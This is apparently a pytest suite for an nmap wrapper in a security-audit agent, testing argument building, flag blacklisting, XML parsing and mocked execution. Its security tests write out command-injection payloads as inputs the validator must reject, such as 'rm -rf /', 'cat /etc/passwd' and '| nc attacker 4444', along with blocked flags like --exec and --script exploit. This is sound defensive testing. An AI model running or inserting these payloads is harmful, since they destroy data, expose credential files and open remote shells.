"""Tests pour l'outil nmap."""

from __future__ import annotations

import textwrap
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from assistant_audit_agent.tools.nmap_tool import (
    BLOCKED_NMAP_FLAGS,
    NmapTool,
    _build_nmap_args,
    _parse_nmap_xml,
    _sanitize_nmap_args,
)


# ── XML nmap de test ─────────────────────────────────────────────────

SAMPLE_NMAP_XML = textwrap.dedent("""\
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE nmaprun>
    <nmaprun scanner="nmap" args="nmap -sV 192.168.1.0/24" start="1711640000">
      <host starttime="1711640001" endtime="1711640010">
        <status state="up" reason="arp-response"/>
        <address addr="192.168.1.1" addrtype="ipv4"/>
        <address addr="AA:BB:CC:DD:EE:FF" addrtype="mac" vendor="Cisco"/>
        <hostnames>
          <hostname name="router.local" type="PTR"/>
        </hostnames>
        <ports>
          <port protocol="tcp" portid="22">
            <state state="open" reason="syn-ack"/>
            <service name="ssh" product="OpenSSH" version="8.9"/>
          </port>
          <port protocol="tcp" portid="80">
            <state state="open" reason="syn-ack"/>
            <service name="http" product="nginx" version="1.24"/>
          </port>
          <port protocol="tcp" portid="443">
            <state state="closed" reason="reset"/>
            <service name="https"/>
          </port>
        </ports>
        <os>
          <osmatch name="Linux 5.x" accuracy="95"/>
        </os>
      </host>
      <host starttime="1711640002" endtime="1711640011">
        <status state="up" reason="arp-response"/>
        <address addr="192.168.1.100" addrtype="ipv4"/>
        <hostnames/>
        <ports>
          <port protocol="tcp" portid="3389">
            <state state="open" reason="syn-ack"/>
            <service name="ms-wbt-server" product="Microsoft Terminal Services"/>
          </port>
        </ports>
      </host>
      <host starttime="1711640003" endtime="1711640012">
        <status state="down" reason="no-response"/>
        <address addr="192.168.1.200" addrtype="ipv4"/>
      </host>
      <runstats>
        <finished time="1711640020" elapsed="20.5" exit="success"/>
        <hosts up="2" down="1" total="3"/>
      </runstats>
    </nmaprun>
""")


@pytest.fixture()
def xml_file(tmp_path: Path) -> Path:
    """Cree un fichier XML nmap de test."""
    p = tmp_path / "scan.xml"
    p.write_text(SAMPLE_NMAP_XML, encoding="utf-8")
    return p


# ── Tests validation d'arguments ─────────────────────────────────────


class TestBuildNmapArgs:
    """Tests de la construction de la commande nmap."""

    def test_discovery_scan(self) -> None:
        args = _build_nmap_args("192.168.1.0/24", "discovery", None)
        assert args == ["nmap", "-sn", "192.168.1.0/24"]

    def test_port_scan(self) -> None:
        args = _build_nmap_args("10.0.0.1", "port_scan", None)
        assert args == ["nmap", "-sV", "--top-ports", "1000", "10.0.0.1"]

    def test_full_scan(self) -> None:
        args = _build_nmap_args("10.0.0.1", "full", None)
        assert args == ["nmap", "-sV", "-sC", "-O", "-p-", "10.0.0.1"]

    def test_custom_scan(self) -> None:
        args = _build_nmap_args("10.0.0.1", "custom", "-sV -T4 -Pn")
        assert "nmap" in args
        assert "-sV" in args
        assert "-T4" in args
        assert "-Pn" in args
        assert "10.0.0.1" in args

    def test_invalid_target_injection(self) -> None:
        with pytest.raises(ValueError, match="Target nmap invalide"):
            _build_nmap_args("192.168.1.1; rm -rf /", "discovery", None)

    def test_invalid_target_pipe(self) -> None:
        with pytest.raises(ValueError, match="Target nmap invalide"):
            _build_nmap_args("192.168.1.1 | cat /etc/passwd", "discovery", None)

    def test_empty_target(self) -> None:
        with pytest.raises(ValueError, match="Target nmap invalide"):
            _build_nmap_args("", "discovery", None)

    def test_invalid_scan_type(self) -> None:
        with pytest.raises(ValueError, match="Type de scan inconnu"):
            _build_nmap_args("10.0.0.1", "exploit", None)

    def test_valid_cidr(self) -> None:
        args = _build_nmap_args("10.0.0.0/8", "discovery", None)
        assert "10.0.0.0/8" in args

    def test_valid_hostname(self) -> None:
        args = _build_nmap_args("server.corp.local", "discovery", None)
        assert "server.corp.local" in args


class TestSanitizeNmapArgs:
    """Tests de la whitelist/blacklist des arguments."""

    def test_allowed_flags(self) -> None:
        result = _sanitize_nmap_args(["-sV", "-T4", "-Pn"])
        assert result == ["-sV", "-T4", "-Pn"]

    def test_blocked_script(self) -> None:
        with pytest.raises(ValueError, match="interdit"):
            _sanitize_nmap_args(["--script", "exploit"])

    def test_blocked_output_file(self) -> None:
        with pytest.raises(ValueError, match="interdit"):
            _sanitize_nmap_args(["-oN", "/tmp/output.txt"])

    def test_blocked_exec_flag(self) -> None:
        with pytest.raises(ValueError, match="interdit"):
            _sanitize_nmap_args(["--exec", "cmd"])

    def test_unknown_flag_rejected(self) -> None:
        with pytest.raises(ValueError, match="non autoris"):
            _sanitize_nmap_args(["--custom-unknown-flag"])

    def test_flag_with_value(self) -> None:
        result = _sanitize_nmap_args(["-T4", "-p80,443"])
        assert "-T4" in result
        assert "-p80,443" in result

    def test_top_ports_with_value(self) -> None:
        result = _sanitize_nmap_args(["--top-ports", "100"])
        assert "--top-ports" in result
        assert "100" in result

    def test_empty_args(self) -> None:
        assert _sanitize_nmap_args([]) == []

    def test_value_with_special_chars_rejected(self) -> None:
        with pytest.raises(ValueError, match="invalide"):
            _sanitize_nmap_args(["-p", "80;rm -rf /"])


# ── Tests parsing XML ────────────────────────────────────────────────


class TestParseNmapXml:
    """Tests du parsing XML nmap."""

    def test_parses_hosts(self, xml_file: Path) -> None:
        result = _parse_nmap_xml(xml_file)
        assert len(result["hosts"]) == 2  # down host filtre

    def test_host_ip(self, xml_file: Path) -> None:
        result = _parse_nmap_xml(xml_file)
        assert result["hosts"][0]["ip"] == "192.168.1.1"

    def test_host_hostname(self, xml_file: Path) -> None:
        result = _parse_nmap_xml(xml_file)
        assert result["hosts"][0]["hostname"] == "router.local"

    def test_host_mac_vendor(self, xml_file: Path) -> None:
        result = _parse_nmap_xml(xml_file)
        assert result["hosts"][0]["mac"] == "AA:BB:CC:DD:EE:FF"
        assert result["hosts"][0]["vendor"] == "Cisco"

    def test_host_os(self, xml_file: Path) -> None:
        result = _parse_nmap_xml(xml_file)
        assert result["hosts"][0]["os"] == "Linux 5.x"

    def test_ports_parsed(self, xml_file: Path) -> None:
        result = _parse_nmap_xml(xml_file)
        ports = result["hosts"][0]["ports"]
        assert len(ports) == 3
        ssh = ports[0]
        assert ssh["port"] == 22
        assert ssh["service"] == "ssh"
        assert ssh["product"] == "OpenSSH"
        assert ssh["version"] == "8.9"

    def test_scan_stats(self, xml_file: Path) -> None:
        result = _parse_nmap_xml(xml_file)
        stats = result["scan_stats"]
        assert stats["hosts_up"] == 2
        assert stats["hosts_down"] == 1
        assert stats["hosts_total"] == 3
        assert stats["elapsed"] == "20.5"

    def test_down_hosts_filtered(self, xml_file: Path) -> None:
        result = _parse_nmap_xml(xml_file)
        ips = [h["ip"] for h in result["hosts"]]
        assert "192.168.1.200" not in ips

    def test_invalid_xml_returns_error(self, tmp_path: Path) -> None:
        bad_xml = tmp_path / "bad.xml"
        bad_xml.write_text("not xml at all", encoding="utf-8")
        result = _parse_nmap_xml(bad_xml)
        assert "error" in result

    def test_second_host_no_os(self, xml_file: Path) -> None:
        result = _parse_nmap_xml(xml_file)
        assert result["hosts"][1]["os"] == ""
        assert result["hosts"][1]["ip"] == "192.168.1.100"


# ── Tests NmapTool (subprocess mocke) ────────────────────────────────


class TestNmapToolExecution:
    """Tests d'execution de NmapTool avec subprocess mocke."""

    @pytest.mark.asyncio
    async def test_nmap_not_installed(self) -> None:
        tool = NmapTool()

        with patch("assistant_audit_agent.tools.nmap_tool._nmap_available", return_value=False):
            result = await tool.execute("task-1", {"target": "10.0.0.1"})

        assert not result.success
        assert "pas install" in result.error

    @pytest.mark.asyncio
    async def test_invalid_target_rejected(self) -> None:
        tool = NmapTool()

        with patch("assistant_audit_agent.tools.nmap_tool._nmap_available", return_value=True):
            result = await tool.execute("task-1", {"target": "192.168.1.1; rm -rf /"})

        assert not result.success
        assert "invalide" in result.error

    @pytest.mark.asyncio
    async def test_successful_scan(self, tmp_path: Path) -> None:
        tool = NmapTool()

        xml_content = SAMPLE_NMAP_XML.encode("utf-8")

        async def fake_subprocess(*args, **kwargs):
            proc = AsyncMock()
            proc.returncode = 0

            lines = [
                b"Starting Nmap 7.94\n",
                b"Nmap scan report for 192.168.1.1\n",
                b"Stats: 0:00:15 elapsed; ... 50.00% done; ETC: ...\n",
                b"",
            ]
            line_idx = {"i": -1}

            async def readline():
                line_idx["i"] += 1
                return lines[line_idx["i"]] if line_idx["i"] < len(lines) else b""

            proc.stdout = AsyncMock()
            proc.stdout.readline = readline
            proc.stderr = AsyncMock()
            proc.stderr.read = AsyncMock(return_value=b"")
            proc.wait = AsyncMock()

            # Ecrire le XML dans le fichier de sortie
            # create_subprocess_exec recoit les args en positional (*args)
            cmd_args = list(args)
            for i, a in enumerate(cmd_args):
                if a == "-oX" and i + 1 < len(cmd_args):
                    Path(cmd_args[i + 1]).write_bytes(xml_content)

            return proc

        on_progress = AsyncMock()

        with patch("assistant_audit_agent.tools.nmap_tool._nmap_available", return_value=True):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_subprocess):
                result = await tool.execute(
                    "task-1",
                    {"target": "192.168.1.0/24", "scan_type": "port_scan"},
                    on_progress=on_progress,
                )

        assert result.success
        assert len(result.output["hosts"]) == 2
        assert on_progress.await_count >= 1

        for a in result.artifacts:
            a.unlink(missing_ok=True)

    @pytest.mark.asyncio
    async def test_nonzero_exit_code(self) -> None:
        tool = NmapTool()

        async def fake_subprocess(*args, **kwargs):
            proc = AsyncMock()
            proc.returncode = 1
            proc.stdout = AsyncMock()
            proc.stdout.readline = AsyncMock(return_value=b"")
            proc.stderr = AsyncMock()
            proc.stderr.read = AsyncMock(return_value=b"Failed to resolve target\n")
            proc.wait = AsyncMock()
            return proc

        with patch("assistant_audit_agent.tools.nmap_tool._nmap_available", return_value=True):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_subprocess):
                result = await tool.execute("task-1", {"target": "10.0.0.1"})

        assert not result.success
        assert "Failed to resolve" in result.error

    @pytest.mark.asyncio
    async def test_cancel_kills_process(self) -> None:
        tool = NmapTool()
        mock_proc = MagicMock()
        tool._process = mock_proc

        await tool.cancel()

        mock_proc.kill.assert_called_once()
        assert tool._process is None

    @pytest.mark.asyncio
    async def test_stdout_streamed_to_progress(self) -> None:
        tool = NmapTool()

        lines_sent = [
            b"Starting Nmap 7.94\n",
            b"Scanning 192.168.1.0/24 [1000 ports]\n",
            b"Discovered open port 22/tcp on 192.168.1.1\n",
            b"Stats: 0:00:15 elapsed; ... 50.00% done; ETC: ...\n",
            b"",
        ]
        line_index = {"i": -1}

        async def readline():
            line_index["i"] += 1
            if line_index["i"] < len(lines_sent):
                return lines_sent[line_index["i"]]
            return b""

        async def fake_subprocess(*args, **kwargs):
            proc = AsyncMock()
            proc.returncode = 0
            proc.stdout = AsyncMock()
            proc.stdout.readline = readline
            proc.stderr = AsyncMock()
            proc.stderr.read = AsyncMock(return_value=b"")
            proc.wait = AsyncMock()

            cmd_args = list(args)
            for i, a in enumerate(cmd_args):
                if a == "-oX" and i + 1 < len(cmd_args):
                    Path(cmd_args[i + 1]).write_text(
                        '<?xml version="1.0"?><nmaprun><runstats>'
                        '<finished elapsed="1"/><hosts up="0" down="0" total="0"/>'
                        '</runstats></nmaprun>'
                    )
            return proc

        progress_lines: list[str] = []

        async def capture_progress(progress: int, lines: list[str]) -> None:
            progress_lines.extend(lines)

        with patch("assistant_audit_agent.tools.nmap_tool._nmap_available", return_value=True):
            with patch("asyncio.create_subprocess_exec", side_effect=fake_subprocess):
                result = await tool.execute(
                    "task-1", {"target": "192.168.1.0/24"},
                    on_progress=capture_progress,
                )

        assert result.success
        # Le buffer doit inclure les 3 lignes precedentes + la ligne Stats (4 au total).
        assert len(progress_lines) == 4
        assert "Discovered open port" in progress_lines[2]
        assert "50.00% done" in progress_lines[3]

        for a in result.artifacts:
            a.unlink(missing_ok=True)


# ── Tests securite detailles ─────────────────────────────────────────


class TestSecurityValidation:
    """Tests approfondis de la validation de securite."""

    def test_all_blocked_flags_rejected(self) -> None:
        for flag in BLOCKED_NMAP_FLAGS:
            with pytest.raises(ValueError, match="interdit"):
                _sanitize_nmap_args([flag, "value"])

    def test_command_injection_in_target(self) -> None:
        payloads = [
            "192.168.1.1; rm -rf /",
            "$(whoami)",
            "`id`",
            "192.168.1.1 && cat /etc/passwd",
            "192.168.1.1 | nc attacker 4444",
        ]
        for payload in payloads:
            with pytest.raises(ValueError, match="invalide"):
                _build_nmap_args(payload, "discovery", None)

    def test_script_injection_via_custom_args(self) -> None:
        with pytest.raises(ValueError, match="interdit"):
            _sanitize_nmap_args(["--script=exploit"])

    def test_output_file_injection(self) -> None:
        with pytest.raises(ValueError, match="interdit"):
            _sanitize_nmap_args(["-oN", "/tmp/pwned.txt"])
